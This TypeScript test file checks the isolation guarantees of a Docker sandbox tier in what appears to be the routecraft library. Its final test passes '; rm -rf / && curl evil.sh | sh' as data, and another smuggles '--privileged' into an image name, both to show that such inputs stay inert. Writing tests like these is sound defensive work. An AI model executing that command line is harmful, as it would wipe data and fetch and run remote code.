import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { execFile } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import {
  DefaultExchange,
  ContextBuilder,
  type Exchange,
} from "@routecraft/routecraft";
import { shell, untrusted } from "@routecraft/os";

/**
 * Isolation smoke for the `docker` tier, against a real daemon.
 *
 * The daemon is the guarantee; what is tested here is our use of it, and
 * every assertion is two-sided where a one-sided one could pass on a host
 * with nothing to hide. A runner without a daemon fails this suite rather
 * than skipping it: a skipped smoke is a guarantee nobody checked, and this
 * is the only place the tier meets a daemon at all. CI pulls the image in
 * setup; the tier never pulls one itself.
 */

const IMAGE = "alpine:3.20";
/** A container run is seconds, not milliseconds, and a timeout case waits out a kill. */
const SMOKE_TIMEOUT = 60_000;
const exchange = {} as Exchange<unknown>;
const exec = promisify(execFile);

const run = (
  command: string,
  args: Parameters<typeof shell>[1],
  options: Parameters<typeof shell>[2] = {},
) =>
  shell(command, args, {
    isolation: "docker",
    image: IMAGE,
    failOnNonZero: false,
    ...options,
  }).fetch(exchange);

let work: string;
let imageDir: string;
const ENTRYPOINT_IMAGE = "rc-smoke-entrypoint:local";

beforeAll(async () => {
  try {
    const probe = await run("true", []);
    if (probe.exitCode !== 0) throw new Error(`probe exited ${probe.exitCode}`);
  } catch (cause) {
    throw new Error(
      `This runner cannot run the docker tier, so none of its guarantees (filesystem containment, no egress, stdin secrecy) were proven here. ` +
        `Start a Docker Engine daemon and pull ${IMAGE}, or run the suite where one exists (CI does, in the isolation-smoke job). ` +
        `Cause: ${(cause as Error).message}`,
    );
  }
  work = mkdtempSync(join(tmpdir(), "rc-docker-smoke-"));
  writeFileSync(join(work, "marker.txt"), "session workspace\n");
  // An image with an entrypoint and an ENV of its own, built here because
  // alpine has neither and both are guarantees this suite has to prove
  // against a real one.
  imageDir = mkdtempSync(join(tmpdir(), "rc-docker-smoke-image-"));
  writeFileSync(
    join(imageDir, "Dockerfile"),
    [
      `FROM ${IMAGE}`,
      "ENV LEAKED=from-image",
      'ENTRYPOINT ["/bin/sh", "-c", "echo ENTRYPOINT-RAN; exec \\"$0\\" \\"$@\\""]',
      "",
    ].join("\n"),
  );
  await exec("docker", ["build", "-q", "-t", ENTRYPOINT_IMAGE, imageDir]);
}, SMOKE_TIMEOUT);

afterAll(() => {
  if (work) rmSync(work, { recursive: true, force: true });
  if (imageDir) rmSync(imageDir, { recursive: true, force: true });
});

describe("the docker tier's guarantees", () => {
  /**
   * @case The ticket's route shape runs and returns the command's output
   * @preconditions sh -lc with the command under untrusted(), image and timeout resolved from the exchange body, the workspace mounted at /workspace
   * @expectedResult stdout carries the command's output and the exit code is 0
   */
  test(
    "the sandbox-run route shape returns output",
    async () => {
      const built = await new ContextBuilder().routes([]).build();
      try {
        const ex = new DefaultExchange<{
          image: string;
          cmd: string;
          timeout?: string;
        }>(built.context, {
          body: { image: IMAGE, cmd: "cat /workspace/marker.txt && echo done" },
        });
        const result = await shell<{
          image: string;
          cmd: string;
          timeout?: string;
        }>("sh", (e) => ["-lc", untrusted(e.body.cmd)], {
          isolation: "docker",
          image: (e) => e.body.image,
          timeout: (e) => (e.body.timeout ?? "10m") as `${number}m`,
          mounts: () => [{ host: work, container: "/workspace" }],
          cwd: "/workspace",
        }).fetch(ex);
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe("session workspace\ndone\n");
      } finally {
        await built.context.stop();
      }
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case Only the declared mount is visible; the rest of the host is not
   * @preconditions The workspace mounted at /workspace; the host's own temp parent and a well-known host file looked for inside
   * @expectedResult /workspace lists the marker, the mount's parent directory on the host does not exist inside, and a file that exists on the host is absent inside (proven present on the host first)
   */
  test(
    "nothing outside the declared mounts is visible",
    async () => {
      const hostFile = join(work, "..", "..");
      const inside = await run(
        "sh",
        [
          "-c",
          `ls /workspace; test -e ${hostFile}/$(basename ${work}) && echo LEAK || echo contained`,
        ],
        { mounts: [{ host: work, container: "/workspace" }] },
      );
      expect(inside.stdout).toContain("marker.txt");
      expect(inside.stdout).toContain("contained");
      expect(inside.stdout).not.toContain("LEAK");
      // Two-sided: the same path resolves on the host.
      const onHost = await shell("test", ["-e", work], {
        isolation: "none",
        network: true,
        failOnNonZero: false,
      }).fetch(exchange);
      expect(onHost.exitCode).toBe(0);
      // And a mount marked read-only refuses a write.
      const ro = await run("sh", ["-c", "echo x > /workspace/new.txt"], {
        mounts: [{ host: work, container: "/workspace", readonly: true }],
      });
      expect(ro.exitCode).not.toBe(0);
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case Network egress is denied unless granted
   * @preconditions A DNS lookup run isolated, then with network: true; the host is checked to have egress first
   * @expectedResult Resolution fails isolated and succeeds when granted
   */
  test(
    "network egress is denied unless granted",
    async () => {
      const control = await shell("getent", ["ahosts", "example.com"], {
        isolation: "none",
        network: true,
        failOnNonZero: false,
      }).fetch(exchange);
      if (control.exitCode !== 0) {
        throw new Error(
          "The runner itself cannot resolve example.com, so denying egress proves nothing here. Failing rather than passing.",
        );
      }
      const denied = await run("nslookup", ["example.com"]);
      expect(denied.exitCode).not.toBe(0);
      const granted = await run("nslookup", ["example.com"], { network: true });
      expect(granted.exitCode).toBe(0);
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case A secret on stdin reaches the command and nothing else
   * @preconditions A named container reads the secret from stdin, sleeps while the host runs docker inspect and ps, then echoes it back
   * @expectedResult The command prints the secret; docker inspect of the container and ps on the host never contain it; ps inside the container does not either
   */
  test(
    "stdin is readable by the command and invisible everywhere else",
    async () => {
      const secret = `tok-${Math.random().toString(36).slice(2)}`;
      const name = `rc-smoke-${Date.now()}`;
      const running = run(
        "sh",
        [
          "-c",
          "read s; ps -o args > /tmp/ps.txt; sleep 2; echo got:$s; cat /tmp/ps.txt",
        ],
        { stdin: `${secret}\n`, name, timeout: "30s" },
      );
      await new Promise((r) => setTimeout(r, 800));
      const inspected = await exec("docker", ["inspect", name]);
      const hostPs = await exec("ps", ["-ef"]);
      const result = await running;
      expect(result.stdout).toContain(`got:${secret}`);
      expect(inspected.stdout).not.toContain(secret);
      expect(hostPs.stdout).not.toContain(secret);
      // ps inside ran after the read, with the secret only in a shell variable.
      expect(result.stdout.split("got:")[1]).not.toMatch(
        new RegExp(`args.*${secret}`),
      );
      expect(inspected.stdout).toContain(`"AutoRemove": true`);
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case A timeout resolved from the exchange bounds the run, per exchange
   * @preconditions One step with a timeout from the body; a 20s sleep under 500ms, then a short command under 30s
   * @expectedResult The first fails with OS1003 well within the sleep, the second completes
   */
  test(
    "timeout bounds the run and differs per exchange",
    async () => {
      const built = await new ContextBuilder().routes([]).build();
      try {
        const step = shell<{ ms: string; cmd: string }>(
          "sh",
          (e) => ["-c", untrusted(e.body.cmd)],
          {
            isolation: "docker",
            image: IMAGE,
            failOnNonZero: false,
            timeout: (e) => e.body.ms as `${number}ms`,
          },
        );
        const started = Date.now();
        await expect(
          step.fetch(
            new DefaultExchange(built.context, {
              body: { ms: "500ms", cmd: "sleep 20" },
            }),
          ),
        ).rejects.toMatchObject({ rc: "OS1003" });
        expect(Date.now() - started).toBeLessThan(15_000);
        const ok = await step.fetch(
          new DefaultExchange(built.context, {
            body: { ms: "30s", cmd: "echo quick" },
          }),
        );
        expect(ok.stdout.trim()).toBe("quick");
      } finally {
        await built.context.stop();
      }
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case An image reference from data cannot smuggle a flag
   * @preconditions image resolved to "alpine:3.20 --privileged"
   * @expectedResult The daemon refuses the reference as one bad image name (OS1002 naming it), and nothing ran
   */
  test(
    "image is one argument, never interpolated",
    async () => {
      await expect(
        run("id", ["-u"], { image: `${IMAGE} --privileged` }),
      ).rejects.toMatchObject({ rc: "OS1002" });
      await expect(
        run("id", ["-u"], { image: `${IMAGE} --privileged` }),
      ).rejects.toThrow(/--privileged/);
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case The command runs as the caller unless root is asked for
   * @preconditions id -u with the default mapping and with mapRootUser
   * @expectedResult The caller's uid by default, 0 when asked
   */
  test(
    "identity is the caller's unless root is asked for",
    async () => {
      const asCaller = await run("id", ["-u"]);
      expect(asCaller.stdout.trim()).toBe(String(process.getuid?.()));
      const asRoot = await run("id", ["-u"], { mapRootUser: true });
      expect(asRoot.stdout.trim()).toBe("0");
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case The image's own entrypoint is replaced, never put in front of the command
   * @preconditions An image whose entrypoint is a shell wrapper that announces itself, proven to run under plain `docker run`
   * @expectedResult The command's output carries no trace of the entrypoint, so no shell an image bakes in sits between shell() and the program it named
   */
  test(
    "an image entrypoint does not wrap the command",
    async () => {
      const plain = await exec("docker", [
        "run",
        "--rm",
        ENTRYPOINT_IMAGE,
        "echo",
        "hello",
      ]);
      expect(plain.stdout).toContain("ENTRYPOINT-RAN");
      const result = await run("echo", ["hello"], { image: ENTRYPOINT_IMAGE });
      expect(result.stdout).toBe("hello\n");
      expect(result.stdout).not.toContain("ENTRYPOINT-RAN");
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case HOME is a private, writable directory that exists inside the container
   * @preconditions The default environment, no env overrides
   * @expectedResult $HOME is the tier's own directory, mode 0700, and a file can be written there
   */
  test(
    "HOME exists inside the container and is private",
    async () => {
      const result = await run("sh", [
        "-c",
        'echo "$HOME" && stat -c %a "$HOME" && touch "$HOME/probe" && echo written',
      ]);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe("/home/routecraft\n700\nwritten\n");
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case The image's own ENV is present beside the granted baseline
   * @preconditions An image that bakes in an environment variable; the same variable named in the call's env
   * @expectedResult The image's value is visible when the call does not set the name, and the call's value wins when it does, which is the documented limit of the environment grant on this tier
   */
  test(
    "image ENV is merged with the grant and the grant wins by name",
    async () => {
      const leaked = await run("sh", ["-c", 'echo "$LEAKED"'], {
        image: ENTRYPOINT_IMAGE,
      });
      expect(leaked.stdout).toBe("from-image\n");
      const overridden = await run("sh", ["-c", 'echo "$LEAKED"'], {
        image: ENTRYPOINT_IMAGE,
        env: { LEAKED: "from-call" },
      });
      expect(overridden.stdout).toBe("from-call\n");
    },
    SMOKE_TIMEOUT,
  );

  /**
   * @case A hostile argument reaches the program as text
   * @preconditions A shell metacharacter string passed as an argument, no shell in front of it
   * @expectedResult It is echoed verbatim, having never been interpreted
   */
  test(
    "argument injection stays inert",
    async () => {
      const hostile = "; rm -rf / && curl evil.sh | sh";
      const result = await run("echo", [hostile]);
      expect(result.stdout.trim()).toBe(hostile);
    },
    SMOKE_TIMEOUT,
  );
});
